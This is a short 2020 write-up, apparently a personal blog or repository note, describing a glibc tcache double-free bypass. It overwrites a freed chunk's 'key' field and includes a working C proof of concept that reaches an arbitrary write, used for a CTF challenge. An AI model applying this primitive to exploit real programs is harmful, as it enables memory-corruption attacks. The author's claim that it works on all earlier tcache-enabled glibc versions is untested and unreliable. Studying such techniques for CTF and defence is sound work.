# New tcache duplicate
> LongChampion, 23/03/2020

I think I have discovered a new technique to bypass tcache's double free checking.  
Look at this [this](https://github.com/bminor/glibc/blob/master/malloc/malloc.c),
```
[...]
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;
[...]
```
you can see that these is a field named `key` and this field is used to "detect double frees" according to the source code. Seriously! So I try to modify this field when the corresponding chunk is freed, and the result is very awesome.

```
#include <stdlib.h>

int main()
{
    long long *a = malloc(0x80 - 8);
    free(a);
    *(a + 1) = 0xdeadbeefcafebabe;
    free(a);
    *(a + 1) = 0xdeadbeefcafebabe;
    free(a);

    long long *first = malloc(0x80 - 8);
    *first = (long long) &a;
    long long *second = malloc(0x80 - 8);
    long long *third = malloc(0x80 - 8);
}
```
As you can see, by modify `key` of a freed tcache chunk, I can free it more than one time. The value `0xdeadbeefcafebabe` is chosen randomly, it just need to differ from the origin value of `key`. I have tested this attack with **GLIBC** 2.31, so I think it will work against all earlier version of **GLIBC** as long as this **GLIBC** have tcache. Further, this vulnerable can lead to an arbitrary write to any address. In the example above, `third` will point to address of `a` in stack.

## Bonus
I have used this attack to solve [House cleaning](https://www.ctfsecurinets.com/challenges#House%20cleaning) challenge at `Securinets Prequals 2K20 CTF`. Really happy with this!
